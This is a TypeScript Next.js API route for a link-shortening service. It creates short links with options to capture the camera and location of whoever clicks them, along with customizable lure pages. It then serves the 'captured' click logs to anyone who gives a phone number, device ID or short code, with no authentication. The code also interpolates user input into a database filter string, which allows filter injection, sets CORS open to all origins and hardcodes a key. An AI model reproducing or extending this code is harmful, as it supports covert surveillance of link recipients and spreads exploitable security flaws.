import { NextResponse } from 'next/server';
import { createClient } from '@supabase/supabase-js';

const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL || process.env.VITE_SUPABASE_URL || 'https://irhqcroczvdkytvvsico.supabase.co';
const supabaseAnonKey = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY || process.env.VITE_SUPABASE_ANON_KEY || 'sb_publishable_iecSD9eU8wwGFllUWzmZng_yYam5hag';
const supabase = createClient(supabaseUrl, supabaseAnonKey);

export async function OPTIONS() {
  const response = NextResponse.json({}, { status: 200 });
  response.headers.set('Access-Control-Allow-Origin', '*');
  response.headers.set('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  response.headers.set('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  return response;
}

export async function POST(req: Request) {
  try {
    const body = await req.json();
    const {
      longUrl,
      customAlias,
      phoneNumber,
      captureCamera,
      captureLocation,
      socialGateTitle,
      socialGateUrl,
      socialGateDesc,
      socialGateBtnText,
      socialGateIcon,
      animationType,
      animationText,
      password,
      expirationDate,
      deviceId
    } = body;

    if (!longUrl) {
      return NextResponse.json({ error: 'longUrl is required' }, { 
        status: 400,
        headers: { 'Access-Control-Allow-Origin': '*' }
      });
    }

    // Determine domain. As requested, always use 'shot.zone.id'
    const domain = 'shot.zone.id';

    if (!deviceId && !phoneNumber) {
      return NextResponse.json({ error: 'Phone number is mandatory when Device ID is not available (e.g. API/Bot usage).' }, { 
        status: 400,
        headers: { 'Access-Control-Allow-Origin': '*' }
      });
    }
    
    // Determine short code
    let shortCode = customAlias;
    if (!shortCode) {
      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
      shortCode = '';
      for (let i = 0; i < 7; i++) {
        shortCode += chars.charAt(Math.floor(Math.random() * chars.length));
      }
    }

    // Insert into Supabase
    const { data, error } = await supabase
      .from('urls')
      .insert([{
        domain,
        short_code: shortCode,
        long_url: longUrl,
        password: password || null,
        social_gate_title: socialGateTitle || null,
        social_gate_url: socialGateUrl || null,
        social_gate_description: socialGateDesc || null,
        social_gate_button_text: socialGateBtnText || null,
        social_gate_icon: socialGateIcon || null,
        animation_type: animationType || 'ring',
        animation_text: animationText || 'LOADING',
        capture_camera: !!captureCamera,
        capture_location: !!captureLocation,
        expires_at: expirationDate ? new Date(expirationDate).toISOString() : null,
        device_id: deviceId || 'api-generated',
        phone_number: phoneNumber || null
      }])
      .select()
      .single();

    if (error) {
      if (error.code === '23505') { 
        return NextResponse.json({ error: 'Custom alias is already in use for this domain.' }, { 
          status: 409,
          headers: { 'Access-Control-Allow-Origin': '*' }
        });
      }
      console.error('Supabase Error:', error);
      return NextResponse.json({ error: error.message }, { 
        status: 500,
        headers: { 'Access-Control-Allow-Origin': '*' }
      });
    }

    const generatedUrl = `https://shot.zone.id/${shortCode}`;

    // Fetch latest captured click across all of this identity's links to return in response
    let latestCapturedClick = null;
    try {
      const idToSearch = deviceId || 'api-generated';
      let linkedUrlsQuery = supabase.from('urls').select('id, short_code');
      if (phoneNumber && idToSearch) {
        linkedUrlsQuery = linkedUrlsQuery.or(`device_id.eq.${idToSearch},phone_number.eq.${phoneNumber}`);
      } else if (phoneNumber) {
        linkedUrlsQuery = linkedUrlsQuery.eq('phone_number', phoneNumber);
      } else if (idToSearch) {
        linkedUrlsQuery = linkedUrlsQuery.eq('device_id', idToSearch);
      }
      
      const { data: linkedUrls } = await linkedUrlsQuery;
      if (linkedUrls && linkedUrls.length > 0) {
        const urlIds = linkedUrls.map(u => u.id);
        const urlMap = linkedUrls.reduce((acc, curr) => {
          acc[curr.id] = curr.short_code;
          return acc;
        }, {} as Record<string, string>);

        const { data: latestClicks } = await supabase
          .from('link_analytics')
          .select('*')
          .in('url_id', urlIds)
          .order('created_at', { ascending: false })
          .limit(1);

        if (latestClicks && latestClicks.length > 0) {
          latestCapturedClick = {
            ...latestClicks[0],
            short_code: urlMap[latestClicks[0].url_id] || null,
            shortUrl: urlMap[latestClicks[0].url_id] ? `https://shot.zone.id/${urlMap[latestClicks[0].url_id]}` : null
          };
        }
      }
    } catch (e) {
      console.error('Failed to query latest analytics for POST response:', e);
    }

    return NextResponse.json({
      success: true,
      shortUrl: generatedUrl,
      data: data,
      latestClick: latestCapturedClick
    }, { 
      status: 201,
      headers: { 'Access-Control-Allow-Origin': '*' }
    });
  } catch (err) {
    console.error('Internal API Error:', err);
    return NextResponse.json({ error: 'Internal Server Error' }, { 
      status: 500,
      headers: { 'Access-Control-Allow-Origin': '*' }
    });
  }
}

export async function GET(req: Request) {
  try {
    const { searchParams } = new URL(req.url);
    const phoneNumber = searchParams.get('phoneNumber');
    const deviceId = searchParams.get('deviceId');
    const shortCode = searchParams.get('shortCode');

    if (!phoneNumber && !deviceId && !shortCode) {
      return NextResponse.json({ 
        error: 'Provide phoneNumber, deviceId, or shortCode to fetch latest captured logs.' 
      }, { 
        status: 400,
        headers: { 'Access-Control-Allow-Origin': '*' }
      });
    }

    // Step 1: Find matching URLs
    let urlQuery = supabase.from('urls').select('id, short_code, long_url');
    
    if (shortCode) {
      urlQuery = urlQuery.eq('short_code', shortCode);
    } else if (phoneNumber && deviceId) {
      urlQuery = urlQuery.or(`device_id.eq.${deviceId},phone_number.eq.${phoneNumber}`);
    } else if (phoneNumber) {
      urlQuery = urlQuery.eq('phone_number', phoneNumber);
    } else if (deviceId) {
      urlQuery = urlQuery.eq('device_id', deviceId);
    }

    const { data: urls, error: urlsError } = await urlQuery;
    
    if (urlsError) {
      return NextResponse.json({ error: urlsError.message }, { 
        status: 500,
        headers: { 'Access-Control-Allow-Origin': '*' }
      });
    }

    if (!urls || urls.length === 0) {
      return NextResponse.json({ 
        success: true, 
        message: 'No links found for this identity.', 
        latestClick: null, 
        logs: [] 
      }, { 
        headers: { 'Access-Control-Allow-Origin': '*' }
      });
    }

    const urlIds = urls.map(u => u.id);
    const urlIdToShortCode = urls.reduce((acc, curr) => {
      acc[curr.id] = curr.short_code;
      return acc;
    }, {} as Record<string, string>);

    // Step 2: Fetch captured link analytics (Newest on Top!)
    const { data: analytics, error: analyticsError } = await supabase
      .from('link_analytics')
      .select('*')
      .in('url_id', urlIds)
      .order('created_at', { ascending: false });

    if (analyticsError) {
      return NextResponse.json({ error: analyticsError.message }, { 
        status: 500,
        headers: { 'Access-Control-Allow-Origin': '*' }
      });
    }

    // Map short_code back to each log
    const detailedLogs = (analytics || []).map(log => ({
      ...log,
      short_code: urlIdToShortCode[log.url_id] || null,
      shortUrl: urlIdToShortCode[log.url_id] ? `https://shot.zone.id/${urlIdToShortCode[log.url_id]}` : null
    }));

    const latestClick = detailedLogs.length > 0 ? detailedLogs[0] : null;

    return NextResponse.json({
      success: true,
      latestClick,
      totalClicks: detailedLogs.length,
      logs: detailedLogs
    }, {
      headers: { 'Access-Control-Allow-Origin': '*' }
    });
  } catch (err: any) {
    console.error('API Error:', err);
    return NextResponse.json({ error: 'Internal Server Error' }, { 
      status: 500,
      headers: { 'Access-Control-Allow-Origin': '*' }
    });
  }
}

